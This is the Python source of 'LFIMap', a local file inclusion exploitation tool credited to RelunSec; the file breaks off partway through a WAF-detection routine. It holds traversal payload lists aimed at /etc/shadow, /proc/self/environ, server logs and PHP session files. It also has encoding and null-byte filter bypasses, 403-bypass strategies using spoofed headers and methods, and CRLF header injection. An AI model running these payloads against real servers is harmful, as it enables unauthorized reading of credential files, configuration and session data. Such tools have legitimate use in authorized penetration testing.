import requests
import argparse
from rich.console import Console
import re
import base64
import sys
import time
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from urllib.parse import quote
import random # Import random for selecting user agents
import os # For session ID bruteforcing

# Initialize Rich Console for cross-platform colored output
console = Console()

# --- Dependency Definitions ---
DEPENDENCIES = {
    "required": {
        "requests": "Used for all HTTP requests.",
        "rich": "Used for colorful console output.",
    },
    "optional": {
        "requests_ntlm": "Required for NTLM authentication (--auth-type ntlm)."
    }
}

# --- Helper Functions for Colored Output (using rich) ---
def print_success(msg):
    """Prints a success message in green."""
    console.print(f"[green][+][/] {msg}")

def print_info(msg):
    """Prints an informational message in cyan."""
    console.print(f"[cyan][*][/] {msg}")

def print_warning(msg):
    """Prints a warning message in yellow."""
    console.print(f"[yellow][!][/] {msg}")

def print_error(msg):
    """Prints an error message in red."""
    console.print(f"[red][-][/] {msg}")

def print_debug(msg):
    """Prints a debug message in magenta."""
    console.print(f"[magenta][DEBUG][/] {msg}")

def print_banner():
    """Prints a stylish banner for the tool using rich markup."""
    banner = r"""
[blue bold]
  _     _ _______ __  __  ___  ____  _____
 | |   | |__   __|  \/  |/ _ \|  _ \|  __ \\
 | |   | |  | |  | \  / | | | | |_) | |__) |
 | |   | |  | |  | |\/| | | | | |  _ <|  _  /
 | |___| |  | |  | |  | | |_| | | |_) | | \ \ 
 |_______|  |_|  |_|  |_|\___/|____/|_|  \_\
[cyan]       Local File Inclusion Exploitation Tool
[cyan]       Developed by RelunSec
[/]
"""
    console.print(banner)

# --- Dependency Management Functions ---
def check_dependencies():
    """Checks if all required and optional dependencies are installed."""
    console.print("\n[bold blue]Checking Dependencies...[/bold blue]")
    all_required_installed = True

    console.print("\n[underline]Required Dependencies:[/underline]")
    for dep, desc in DEPENDENCIES["required"].items():
        try:
            __import__(dep)
            print_success(f"'{dep}' is installed. ({desc})")
        except ImportError:
            print_error(f"'{dep}' is NOT installed. ({desc})")
            all_required_installed = False

    console.print("\n[underline]Optional Dependencies:[/underline]")
    for dep, desc in DEPENDENCIES["optional"].items():
        try:
            __import__(dep)
            print_info(f"'{dep}' is installed. ({desc})")
        except ImportError:
            print_warning(f"'{dep}' is NOT installed. ({desc})")

    if not all_required_installed:
        print_error("\n[bold red]Error: Missing required dependencies. Please install them to proceed.[/bold red]")
        missing_required = [dep for dep in DEPENDENCIES["required"] if not _is_module_installed(dep)]
        print_info(f"You can install missing dependencies using pip, e.g.: [yellow]pip install {' '.join(missing_required)}[/]")
        sys.exit(1)
    else:
        print_success("\n[bold green]All required dependencies are installed.[/bold green]")
    console.print("[bold blue]Dependency check complete.[/bold blue]")

def list_dependencies():
    """Lists all required and optional dependencies with their status."""
    console.print("\n[bold blue]Listing Dependencies:[/bold blue]")

    console.print("\n[underline]Required Dependencies:[/underline]")
    for dep, desc in DEPENDENCIES["required"].items():
        if _is_module_installed(dep):
            status = "[green]Installed[/]"
        else:
            status = "[red]Missing[/]"
        console.print(f"  - [yellow]{dep}[/]: {desc} ([bold]{status}[/])")

    console.print("\n[underline]Optional Dependencies:[/underline]")
    for dep, desc in DEPENDENCIES["optional"].items():
        if _is_module_installed(dep):
            status = "[green]Installed[/]"
        else:
            status = "[red]Missing[/]"
        console.print(f"  - [yellow]{dep}[/]: {desc} ([bold]{status}[/])")
    console.print("[bold blue]Dependency list complete.[/bold blue]")

def _is_module_installed(module_name):
    """Helper function to check if a module is installed."""
    try:
        __import__(module_name)
        return True
    except ImportError:
        return False

# --- User-Agent Definitions ---
USER_AGENTS = {
    "chrome": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
    ],
    "firefox": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0",
        "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
    ],
    "brave": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Brave/126.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 Brave/126.0.0.0",
    ],
    "safari": [
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Version/17.5 Safari/537.36", # Sometimes Safari mimics Chrome for compatibility
    ],
    "opera": [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/109.0.0.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 OPR/109.0.0.0",
    ]
}
MOBILE_USER_AGENT = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1"

# --- Common LFI Paths by OS ---
COMMON_PATHS_UNIX = [
    "../../../../etc/passwd",
    "../../../../etc/shadow",
    "../../../../etc/hosts",
    "../../../../etc/resolv.conf",
    "../../../../etc/issue",
    "../../../../proc/self/environ",
    "../../../../proc/version",
    "../../../../var/log/apache2/access.log",
    "../../../../var/log/nginx/access.log",
    "../../../../var/log/auth.log",
    "../../../../var/log/syslog",
    "../../../../etc/php/php.ini",
    "../../../../etc/httpd/conf/httpd.conf",
    "../../../../etc/apache2/apache2.conf",
    "../../../../etc/apache2/sites-available/default",
    "../../../../etc/nginx/nginx.conf",
    "../../../../etc/nginx/sites-available/default",
]

COMMON_PATHS_WINDOWS = [
    "../../../../windows/win.ini",
    "../../../../boot.ini",
    "../../../../Windows/System32/drivers/etc/hosts",
    "../../../../inetpub/logs/LogFiles/W3SVC1/exYYMMDD.log", # IIS logs, YMMDD needs to be dynamic or fuzzed
    "../../../../Program Files/Apache Group/Apache/conf/httpd.conf",
    "../../../../Program Files/Apache Group/Apache2/conf/httpd.conf",
    "../../../../Program Files/nginx/conf/nginx.conf",
    "../../../../php.ini",
    "../../../../Windows/php.ini",
]

COMMON_PATHS_MACOS = [
    "../../../../etc/passwd", # Exists, but often minimal
    "../../../../etc/hosts",
    "../../../../var/log/apache2/access_log", # macOS specific Apache log
    "../../../../var/log/nginx/access.log",
    "../../../../private/etc/apache2/httpd.conf",
    "../../../../private/etc/php.ini",
]

# Common PHP session paths (can be OS-specific but often similar patterns)
PHP_SESSION_PATHS_UNIX = [
    "/var/lib/php/sessions/sess_",
    "/var/lib/php5/sessions/sess_",
    "/tmp/sess_",
    "/tmp/php_sessions/sess_",
    "/var/www/sessions/sess_",
]

PHP_SESSION_PATHS_WINDOWS = [
    "C:\\Windows\\Temp\\php\\sess_",
    "C:\\Windows\\Temp\\sess_",
    "C:\\php\\sessions\\sess_",
]

PHP_SESSION_PATHS_MACOS = [
    "/var/tmp/sess_",
    "/tmp/sess_",
]

# --- LFITool Class ---
class LFITool:
    """
    Core class for LFIMap, handling various LFI exploitation techniques.
    """
    def __init__(self, url, args):
        """
        Initializes the LFITool with the target URL and command-line arguments.
        Sets up the HTTP session with custom headers, cookies, proxy settings,
        and authentication.
        """
        self.url = url
        self.args = args
        self.session = requests.Session()
        self.server_type = "Unknown" # To be detected

        # Configure retries for the session
        retries = Retry(total=args.retries, backoff_factor=0.5, status_forcelist=[500, 502, 503, 504])
        self.session.mount('http://', HTTPAdapter(max_retries=retries))
        self.session.mount('https://', HTTPAdapter(max_retries=retries))

        # Configure proxy if provided
        if args.proxy:
            self.session.proxies = {'http': args.proxy, 'https': args.proxy}
        
        # Configure User-Agent: prioritize custom UA, then browser-specific UA, then mobile UA, else default
        if args.user_agent:
            self.session.headers.update({'User-Agent': args.user_agent})
            print_info(f"Using Custom User-Agent: [yellow]{args.user_agent}[/]")
        elif args.browser_user_agent:
            browser_name = args.browser_user_agent.lower()
            if browser_name in USER_AGENTS:
                selected_ua = random.choice(USER_AGENTS[browser_name])
                self.session.headers.update({'User-Agent': selected_ua})
                print_info(f"Using Random {browser_name.capitalize()} User-Agent: [yellow]{selected_ua}[/]")
            else:
                print_warning(f"Unknown browser type '{args.browser_user_agent}'. Using default User-Agent.")
        elif args.mobile:
            self.session.headers.update({'User-Agent': MOBILE_USER_AGENT})
            print_info(f"Using Mobile User-Agent: [yellow]{MOBILE_USER_AGENT}[/]")
        
        # Configure custom cookies
        if args.cookies:
            try:
                cookies_dict = dict(item.split("=", 1) for item in args.cookies.split(";"))
                self.session.cookies.update(cookies_dict)
            except ValueError:
                print_error("Invalid cookie format. Use 'key1=val1;key2=val2'.")
                sys.exit(1)
        
        # Configure custom headers
        if args.headers:
            try:
                headers_dict = dict(item.split(":", 1) for item in args.headers.split(";"))
                self.session.headers.update(headers_dict)
            except ValueError:
                print_error("Invalid header format. Use 'Header1:Value1;Header2:Value2'.")
                sys.exit(1)

        # Configure Referer header
        if args.referer:
            self.session.headers.update({'Referer': args.referer})
            print_info(f"Using Referer: [yellow]{args.referer}[/]")

        # Configure authentication
        if args.auth_user and args.auth_pass:
            # Import HttpNtlmAuth only if needed and available
            _HttpNtlmAuth = None
            try:
                from requests_ntlm import HttpNtlmAuth as ImportedHttpNtlmAuth
                _HttpNtlmAuth = ImportedHttpNtlmAuth
            except ImportError:
                pass # Handled by dependency check, but for runtime, ensure it's None if not found

            if args.auth_type == 'basic':
                print_info(f"Configured Basic Authentication for user: [yellow]{args.auth_user}[/]")
                self.session.auth = requests.auth.HTTPBasicAuth(args.auth_user, args.auth_pass)
            elif args.auth_type == 'ntlm':
                if _HttpNtlmAuth:
                    if args.ntlm_domain:
                        username = f"{args.ntlm_domain}\\{args.auth_user}"
                    else:
                        username = args.auth_user
                    print_info(f"Configured NTLM Authentication for user: [yellow]{username}[/]")
                    self.session.auth = _HttpNtlmAuth(username, args.auth_pass)
                else:
                    print_error("requests-ntlm library not installed. NTLM authentication is not available.")
                    sys.exit(1)
            else:
                print_error(f"Unsupported authentication type: {args.auth_type}")
                sys.exit(1)
        
        # Handle HTTP Version
        if args.http_version:
            if args.http_version == '1.1':
                print_info(f"Using HTTP/1.1 (default for requests library).")
            elif args.http_version == '1.0':
                print_warning(f"Attempting to use HTTP/1.0. Note: The 'requests' library primarily uses HTTP/1.1 and direct forcing of HTTP/1.0 is not always straightforward.")
                # Requests library handles HTTP/1.0 negotiation, no explicit code change here.
            elif args.http_version == '2':
                print_warning(f"HTTP/2.0 is not natively supported by the 'requests' library. LFIMap will proceed using HTTP/1.1.")
                # No explicit code change for HTTP/2 as requests doesn't support it directly.
            else:
                print_warning(f"Unsupported HTTP version specified: {args.http_version}. Using default HTTP/1.1.")


        # Attempt to detect server type
        self._detect_server_type()

    def _detect_server_type(self):
        """Attempts to detect the web server type from the initial response."""
        try:
            # Make a quick request to the base URL to get server header
            base_url_for_detection = self.url.replace("?file=FUZZ", "").replace("&file=FUZZ", "").replace("FUZZ", "")
            response = self.session.head(base_url_for_detection, timeout=self.args.timeout, verify=not self.args.no_ssl_verify)
            if response.status_code == 200 and 'Server' in response.headers:
                server_header = response.headers['Server'].lower()
                if 'apache' in server_header:
                    self.server_type = "Apache"
                elif 'nginx' in server_header:
                    self.server_type = "Nginx"
                elif 'iis' in server_header:
                    self.server_type = "IIS"
                else:
                    self.server_type = server_header
                print_info(f"Detected Web Server Type: [yellow]{self.server_type}[/]")
            else:
                print_warning("Could not detect web server type from initial response.")
        except requests.exceptions.RequestException as e:
            print_warning(f"Failed to detect server type: {e}")

    def _apply_encoding_and_tricks(self, payload):
        """
        Adds various encoding and obfuscation tricks to the payload,
        including payload-modifying plugins.
        """
        # Start with a copy of the payload to modify
        modified_payload = payload

        if self.args.encode_url:
            modified_payload = quote(modified_payload)
            if self.args.verbose: print_debug(f"Applied URL encoding: {modified_payload}")
        
        if self.args.encode_double_url:
            modified_payload = quote(quote(modified_payload))
            if self.args.verbose: print_debug(f"Applied Double URL encoding: {modified_payload}")

        if self.args.encode_triple_url:
            modified_payload = quote(quote(quote(modified_payload)))
            if self.args.verbose: print_debug(f"Applied Triple URL encoding: {modified_payload}")
        
        if self.args.null_byte:
            modified_payload += "%00"
            if self.args.verbose: print_debug(f"Added null byte: {modified_payload}")
            
        if self.args.path_truncation:
            modified_payload += "/." * 200
            if self.args.verbose: print_debug(f"Applied path truncation: {modified_payload}")

        # Apply payload-modifying plugins
        if self.args.plugin: # Check if any plugins are enabled
            if "questionmark" in self.args.plugin and self.args.os == "unix":
                if self.args.verbose: print_debug("Applying Question Mark plugin.")
                modified_payload += "??"
            
            if "doubleslash2slash" in self.args.plugin and self.args.os == "windows":
                if self.args.verbose: print_debug("Applying Double Slash to Single Slash plugin.")
                modified_payload = modified_payload.replace("\\", "/") # Convert backslashes to forward slashes
            
            if "unicodetrick" in self.args.plugin:
                if self.args.verbose: print_debug("Applying Unicode Trick plugin.")
                # Simple unicode encoding for common path traversal characters
                modified_payload = modified_payload.replace("/", "%c0%af") # Overlong UTF-8 encoding for '/'
                modified_payload = modified_payload.replace("\\", "%c0%5c") # Overlong UTF-8 encoding for '\'
                if self.args.verbose: print_debug(f"Applied Unicode Trick: {modified_payload}")

            if "extra-dot" in self.args.plugin:
                if self.args.verbose: print_debug("Applying Extra Dot plugin.")
                # Add a trailing dot before any query parameters or fragment
                if '?' in modified_payload:
                    base, query = modified_payload.split('?', 1)
                    modified_payload = base + ".?" + query
                else:
                    modified_payload += "."
                if self.args.verbose: print_debug(f"Applied Extra Dot: {modified_payload}")

            if "semicolon-injection" in self.args.plugin:
                if self.args.verbose: print_debug("Applying Semicolon Injection plugin.")
                # Appends ;.php or ;.txt to trick path validators
                # This needs to be carefully placed, typically before the actual extension
                # For simplicity, appending to the end of the payload for now.
                modified_payload += ";.php" # Can also try ;.txt, ;.asp, etc.
                if self.args.verbose: print_debug(f"Applied Semicolon Injection: {modified_payload}")

            if "base64-in-path" in self.args.plugin:
                if self.args.verbose: print_debug("Applying Base64 in Path plugin.")
                # This is a complex trick. For a basic implementation, we'll try to base64 encode the entire payload.
                # A more advanced version would parse the path and encode specific segments.
                try:
                    modified_payload = base64.b64encode(modified_payload.encode()).decode()
                    if self.args.verbose: print_debug(f"Applied Base64 in Path: {modified_payload}")
                except Exception as e:
                    print_warning(f"Failed to apply Base64 in Path: {e}")

            if "tab-trick" in self.args.plugin:
                if self.args.verbose: print_debug("Applying Tab Trick plugin.")
                # Insert %09 (tab) character. This is typically effective before an extension.
                # Find last dot for extension, if exists.
                if '.' in modified_payload:
                    parts = modified_payload.rsplit('.', 1)
                    modified_payload = parts[0] + "%09." + parts[1]
                else:
                    modified_payload += "%09" # Append if no extension
                if self.args.verbose: print_debug(f"Applied Tab Trick: {modified_payload}")

            if "comment-trick" in self.args.plugin:
                if self.args.verbose: print_debug("Applying Comment Trick plugin.")
                # Inserts /* style comments. This can be complex to place correctly.
                # For basic LFI, we'll try to insert it after the first directory traversal.
                modified_payload = modified_payload.replace("../", "*/../*/", 1) # Replace first ../
                if self.args.verbose: print_debug(f"Applied Comment Trick: {modified_payload}")

            if "dotdot-trick" in self.args.plugin:
                if self.args.verbose: print_debug("Applying Dotdot Trick plugin.")
                # Inserts double .. in traversal (e.g., /....//etc/passwd).
                modified_payload = modified_payload.replace("../", "/....//")
                if self.args.verbose: print_debug(f"Applied Dotdot Trick: {modified_payload}")

            if "fat-dot" in self.args.plugin:
                if self.args.verbose: print_debug("Applying Fat Dot plugin.")
                # Adds %e2%80%ae (right-to-left override) to obfuscate filenames.
                # This is highly dependent on the target's filesystem and display.
                # For example, to make 'passwd' look like 'dssap.tc/e'
                # This is tricky to apply generically. Let's apply it to a common file like 'passwd'.
                if "passwd" in modified_payload:
                    modified_payload = modified_payload.replace("passwd", "pass%e2%80%aed")
                if self.args.verbose: print_debug(f"Applied Fat Dot: {modified_payload}")

            if "utf7-bypass" in self.args.plugin:
                if self.args.verbose: print_debug("Applying UTF-7 Bypass plugin.")
                # This requires the server to interpret UTF-7.
                # Example: <script> becomes +ADw-script+AD4-
                try:
                    # Simple UTF-7 encoding, assumes ASCII input for payload parts
                    # This is a very specific trick and might not be generally applicable to file paths
                    # For a file path, it's usually about encoding slashes/dots.
                    # As a general payload trick:
                    utf7_encoded_payload = ""
                    for char in modified_payload:
                        if ord(char) < 128: # ASCII characters
                            utf7_encoded_payload += char
                        else: # Non-ASCII, or for tricking filters, encode common chars
                            # This is a simplification. Real UTF-7 is more complex.
                            # For a basic bypass, we might encode slashes or dots.
                            if char == '/':
                                utf7_encoded_payload += "+AC8-"
                            elif char == '.':
                                utf7_encoded_payload += "+AC4-"
                            else:
                                utf7_encoded_payload += char # Fallback
                    modified_payload = utf7_encoded_payload
                    if self.args.verbose: print_debug(f"Applied UTF-7 Bypass: {modified_payload}")
                except Exception as e:
                    print_warning(f"Failed to apply UTF-7 Bypass: {e}")
            
            if "iis-double-slash" in self.args.plugin and self.args.os == "windows":
                if self.args.verbose: print_debug("Applying IIS Double Slash plugin.")
                # Insert double slashes after drive letter or at the beginning of path
                if modified_payload.startswith("C:/"):
                    modified_payload = modified_payload.replace("C:/", "C://", 1)
                elif modified_payload.startswith("/"):
                    modified_payload = "/" + modified_payload # Ensures leading double slash
                modified_payload = modified_payload.replace("//", "///") # Replace existing double slashes with triple for more bypasses
                if self.args.verbose: print_debug(f"Applied IIS Double Slash: {modified_payload}")


        return modified_payload

    def _apply_request_plugins(self, headers):
        """
        Applies plugins that modify request headers.
        """
        modified_headers = headers.copy()

        if self.args.plugin: # Check if any plugins are enabled
            if "xforwardedfor" in self.args.plugin:
                if self.args.verbose: print_debug("Applying X-Forwarded-For plugin.")
                modified_headers['X-Forwarded-For'] = '127.0.0.1'
            
            if "spoofhost-header" in self.args.plugin:
                if self.args.verbose: print_debug("Applying Spoof Host Header plugin.")
                modified_headers['Host'] = 'localhost' # Can be made configurable if needed

            if "clrf-injection" in self.args.plugin:
                if self.args.verbose: print_debug("Applying CRLF Injection plugin.")
                # Inject CRLF into User-Agent header (common for log poisoning or header injection)
                # This is a simple example. Real CRLF injection might require more specific placement.
                modified_headers['User-Agent'] = modified_headers.get('User-Agent', 'LFIMap') + "\r\nX-Injected-Header: CRLF-Test"
                if self.args.verbose: print_debug(f"Applied CRLF Injection to User-Agent: {modified_headers['User-Agent']}")
        
        return modified_headers

    def _make_request(self, payload, method='GET', data=None, files=None, headers=None, target_url=None):
        """
        Makes an HTTP request with the given payload.
        The 'FUZZ' placeholder in the self.url or data/body is replaced by the payload.
        
        Args:
            payload (str): The LFI payload to insert.
            method (str): HTTP method (GET or POST).
            data (dict/str): Data for POST requests.
            files (dict): Files for POST requests (e.g., for file uploads).
            headers (dict): Additional headers for this specific request.
            target_url (str): If provided, this URL is used instead of self.url with FUZZ.
        
        Returns:
            requests.Response or None: The response object if successful, None otherwise.
        """
        # Apply payload-specific encoding and tricks first
        processed_payload = self._apply_encoding_and_tricks(payload)

        # Determine the base URL to use for this request
        base_url_for_fuzzing = target_url if target_url else self.url

        # Replace FUZZ with the processed payload
        full_url = base_url_for_fuzzing.replace("FUZZ", processed_payload)
        
        # Prepare request headers, starting with session defaults and then adding specific ones
        request_headers = self.session.headers.copy()
        if headers:
            request_headers.update(headers)

        # Apply request-modifying plugins
        request_headers = self._apply_request_plugins(request_headers)

        # If data was provided, ensure FUZZ is replaced there too
        request_data_final = data
        if request_data_final and "FUZZ" in str(request_data_final):
            if isinstance(request_data_final, dict):
                request_data_final = {k: v.replace("FUZZ", processed_payload) if isinstance(v, str) else v for k, v in request_data_final.items()}
            elif isinstance(request_data_final, str):
                request_data_final = request_data_final.replace("FUZZ", processed_payload)

        if self.args.verbose:
            print_debug(f"--- Request Details ---")
            print_debug(f"URL: {full_url}")
            print_debug(f"Method: {method.upper()}")
            print_debug(f"Headers: {request_headers}")
            if request_data_final:
                print_debug(f"Body/Data: {request_data_final}")
            print_debug(f"-----------------------")

        # Store original cookies if --ignore-set-cookie is enabled
        original_cookies = None
        if self.args.ignore_set_cookie:
            original_cookies = self.session.cookies.copy()
            self.session.cookies.clear() # Clear session cookies before request

        try:
            start_time = time.time()
            if method.upper() == 'GET':
                response = self.session.get(
                    full_url, 
                    timeout=self.args.timeout, 
                    verify=not self.args.no_ssl_verify,
                    headers=request_headers,
                    allow_redirects=not self.args.ignore_redirects
                )
            elif method.upper() == 'POST':
                response = self.session.post(
                    full_url, 
                    data=request_data_final, # Use the potentially modified data
                    files=files, 
                    timeout=self.args.timeout, 
                    verify=not self.args.no_ssl_verify,
                    headers=request_headers,
                    allow_redirects=not self.args.ignore_redirects
                )
            else:
                print_error(f"Unsupported HTTP method: {method}")
                return None
            end_time = time.time()
            response.elapsed_time = end_time - start_time

            # Plugin: MIME Type Check
            if self.args.plugin and "mimetype-check" in self.args.plugin:
                content_type = response.headers.get('Content-Type', '').lower()
                if 'text/html' in content_type or 'application/xhtml+xml' in content_type:
                    if self.args.verbose: print_debug(f"MIME Type Check: Content-Type is HTML/XHTML ({content_type})")
                else:
                    print_info(f"MIME Type Check: Unusual Content-Type detected: [yellow]{content_type}[/]")

            # Plugin: Rate Limit Adapter (simple delay)
            if self.args.plugin and "rate-limit-adapter" in self.args.plugin:
                delay = 0.5 # configurable delay
                if self.args.verbose: print_debug(f"Applying Rate Limit Adapter: Sleeping for {delay} seconds.")
                time.sleep(delay)


            return response
        except requests.exceptions.ConnectionError as e:
            print_error(f"Connection Error for {full_url}: {e}")
            if not self.args.ignore_server_error:
                sys.exit(1)
            return None
        except requests.exceptions.Timeout as e:
            print_error(f"Timeout Error for {full_url}: {e}")
            if not self.args.ignore_server_error:
                sys.exit(1)
            return None
        except requests.exceptions.HTTPError as e:
            print_error(f"HTTP Error for {full_url}: {e}")
            if not self.args.ignore_server_error:
                sys.exit(1)
            return None
        except requests.exceptions.RequestException as e:
            print_error(f"General Request Error for {full_url}: {e}")
            if not self.args.ignore_server_error:
                sys.exit(1)
            return None
        finally:
            if self.args.ignore_set_cookie and original_cookies is not None:
                self.session.cookies.update(original_cookies)


    def _check_lfi_indicators(self, text):
        """
        Checks the response text for common LFI indicators (e.g., /etc/passwd content)
        and common LFI error messages.
        
        Args:
            text (str): The response text to check.
            
        Returns:
            bool: True if indicators are found, False otherwise.
        """
        common_content_indicators = [
            "root:x:0:0:",          # /etc/passwd
            "daemon:x:1:1:",         # /etc/passwd
            "nobody:x:",             # /etc/passwd
            "C:\\Windows\\System32", # Windows paths
            "[boot loader]",         # boot.ini
            "for 16-bit app support",# win.ini
            "<?php",                 # PHP code
        ]
        
        common_error_indicators = [
            "failed to open stream",
            "No such file or directory",
            "include(): Failed opening",
            "require_once(): Failed opening",
            "Warning: include(",
            "Warning: require_once(",
            "open_basedir restriction in effect",
            "file_get_contents(): failed to open stream",
        ]

        found_content = any(indicator in text for indicator in common_content_indicators)
        found_error = any(indicator in text for indicator in common_error_indicators)
        is_html = "<!DOCTYPE html>" in text.lower() or "<html" in text.lower()

        if found_content:
            return True, "CONTENT"
        
        if found_error:
            # Plugin: LFI Error Fingerprint
            if self.args.plugin and "lfi-error-fingerprint" in self.args.plugin:
                print_info(f"LFI Error Fingerprint: Detected specific LFI error message.")
            return True, "ERROR_MESSAGE"
        
        # If it's HTML, we need more specific indicators than just generic HTML tags
        if is_html:
            # Re-check content indicators, excluding generic HTML tag from the list
            if any(indicator in text for indicator in common_content_indicators):
                return True, "CONTENT"
        
        return False, "NONE"

    def _handle_403_bypass(self, original_payload, original_method, original_data):
        """
        Attempts various 403 bypass techniques for a given payload.
        Returns (True, content) if bypass is successful, else (False, None).
        """
        # Store original headers to restore them later
        original_session_headers = self.session.headers.copy()

        # List of bypass strategies: (method, path_modifier_func, headers_to_add)
        # path_modifier_func is a lambda that modifies the URL path part (before query)
        # headers_to_add is a dict of headers to temporarily add
        bypass_strategies = [
            # 1. Different HTTP Methods
            ('GET', lambda p: p, {}),
            ('POST', lambda p: p, {}),
            ('HEAD', lambda p: p, {}),
            ('OPTIONS', lambda p: p, {}),
            ('PUT', lambda p: p, {}),
            ('DELETE', lambda p: p, {}),

            # 2. X-Original-URL / X-Rewrite-URL
            (original_method, lambda p: p, {'X-Original-URL': self.url.split('?')[0]}),
            (original_method, lambda p: p, {'X-Rewrite-URL': self.url.split('?')[0]}),

            # 3. X-Forwarded-For
            (original_method, lambda p: p, {'X-Forwarded-For': '127.0.0.1'}),
            (original_method, lambda p: p, {'X-Forwarded-For': 'localhost'}),

            # 4. Trailing slash/dot
            (original_method, lambda p: p + "/", {}),
            (original_method, lambda p: p + "./", {}),
            (original_method, lambda p: p + "/.", {}),

            # 5. Host Header Spoofing
            (original_method, lambda p: p, {'Host': 'localhost'}),
            (original_method, lambda p: p, {'Host': '127.0.0.1'}),
            (original_method, lambda p: p, {'Host': 'example.com'}),

            # 6. Referer Header Spoofing
            (original_method, lambda p: p, {'Referer': 'http://google.com'}),
            (original_method, lambda p: p, {'Referer': 'http://localhost/'}),

            # 7. Path normalization bypasses (e.g., %2e%2e%2f for ../)
            (original_method, lambda p: p.replace("../", "%2e%2e%2f"), {}),
            (original_method, lambda p: p.replace("../", "..%252f"), {}), # Double encoded
            (original_method, lambda p: p.replace("/", "%2f"), {}), # URL encode all slashes
            (original_method, lambda p: p.replace("/", "%ff/"), {}), # Null byte before slash (Apache specific)
        ]

        for method, path_modifier_func, extra_headers in bypass_strategies:
            # Construct the URL for this specific bypass attempt
            base_url_part = self.url.split('?')[0]
            query_string_part = "?" + self.url.split('?')[1] if '?' in self.url else ""

            # Apply path modifier to the base URL part (e.g., add trailing slash)
            modified_base_url = path_modifier_func(base_url_part)
            
            # Reconstruct the full URL template with the original FUZZ placeholder
            temp_url_for_request = modified_base_url + query_string_part

            # Combine existing session headers with any extra headers for this attempt
            current_headers = self.session.headers.copy()
            current_headers.update(extra_headers)

            print_info(f"Trying 403 bypass: Method='{method}', URL_mod='{path_modifier_func.__name__}', Headers={extra_headers}")
            
            # Make the request using the original payload
            response = self._make_request(
                original_payload,
                method=method,
                data=original_data, # Use original data template
                headers=current_headers,
                target_url=temp_url_for_request # Pass the constructed URL template
            )

            if response and response.status_code == 200:
                found, indicator_type = self._check_lfi_indicators(response.text)
                if found:
                    print_success(f"403 bypass successful with technique: Method='{method}', URL_mod='{path_modifier_func.__name__}', Headers={extra_headers}")
                    print_info("Content snippet (first 500 characters):")
                    console.print(response.text[:500] + "..." if len(response.text) > 500 else response.text)
                    self.session.headers = original_session_headers # Restore headers
                    return True, response.text
                else:
                    print_warning(f"403 bypass technique returned 200 OK, but no LFI indicators found.")
            elif response:
                print_warning(f"403 bypass technique returned status code: {response.status_code}")
            
        self.session.headers = original_session_headers # Always restore headers
        print_error("All 403 bypass techniques failed.")
        return False, None

    def test_lfi_payload(self, payload, method='GET', data=None):
        """
        Tests a single LFI payload and reports the result.
        
        Args:
            payload (str): The LFI payload to test.
            method (str): HTTP method (GET or POST).
            data (dict/str): Data for POST requests.
            
        Returns:
            tuple: (True/False, response_text) indicating success and the content.
        """
        print_info(f"Testing payload: [yellow]{payload}[/] (Method: {method.upper()})")
        response = self._make_request(payload, method=method, data=data)
        
        # Plugin: WAF Detection
        if self.args.plugin and "waf-detection" in self.args.plugin:
            self._detect_waf(response)

        if response and response.status_code == 200:
            found, indicator_type = self._check_lfi_indicators(response.text)
            if found:
                if indicator_type == "CONTENT":
                    print_success(f"LFI confirmed with payload: [green]{payload}[/] (Content Found)")
                    print_info("Content snippet (first 500 characters):")
                    console.print(response.text[:500] + "..." if len(response.text) > 500 else response.text)
                    # Plugin: Exfil Data (simple output)
                    if self.args.plugin and "exfil-data" in self.args.plugin:
                        print_info("Exfil Data plugin enabled. Content found is displayed above. For more targeted exfiltration, use the interactive shell.")
                elif indicator_type == "ERROR_MESSAGE":
                    print_success(f"LFI likely confirmed with payload: [green]{payload}[/] (Error Message Found)")
                    print_info("Error message snippet (first 500 characters):")
                    console.print(response.text[:500] + "..." if len(response.text) > 500 else response.text)
                return True, response.text
            else:
                print_warning(f"Payload {payload} returned 200 OK, but no common LFI indicators found.")
                if self.args.verbose:
                    print_info("Full response content (verbose):")
                    console.print(response.text)
        elif response and response.status_code == 403 and self.args.plugin and "403" in self.args.plugin:
            print_warning(f"Payload {payload} returned 403 Forbidden. Attempting bypasses...")
            # Call the 403 bypass handler
            bypassed, bypass_content = self._handle_403_bypass(payload, method, data)
            if bypassed:
                print_success(f"403 bypass successful for payload: [green]{payload}[/]")
                return True, bypass_content
            else:
                print_error(f"403 bypass failed for payload: [red]{payload}[/]")
                return False, None
        elif response:
            print_warning(f"Payload {payload} returned status code: {response.status_code}")
        return False, None

    def _detect_waf(self, response):
        """
        Identifies common WAFs based on response headers and content.
        """
        waf_signatures = {
            "Cloudflare": ["server: cloudflare", "cf-ray", "cloudflare-nginx"],
            "Sucuri": ["server: sucuri", "x-sucuri-cache", "x-sucuri-id"],
            "Incapsula": ["x-incapsula-proxy-id", "x-incapsula-cache"],
